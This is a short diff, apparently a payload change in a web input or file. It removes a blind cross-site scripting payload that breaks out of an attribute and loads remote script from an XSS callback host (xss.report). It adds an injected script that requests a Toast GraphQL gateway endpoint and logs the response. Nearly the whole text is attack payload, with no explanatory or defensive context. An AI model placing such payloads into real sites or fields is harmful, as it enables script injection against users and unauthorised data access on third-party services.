@@ -1,1 +1,7 @@
-'"><script src=https://xss.report/c/stish834></script>
+<script>
+  const req = new XMLHttpRequest();
+  req.open("GET", "https://ws-api.toasttab.com/do-federated-gateway/v1/graphql");
+  req.send();
+  const res = req.responseText;
+  console.log(res);
+</script>
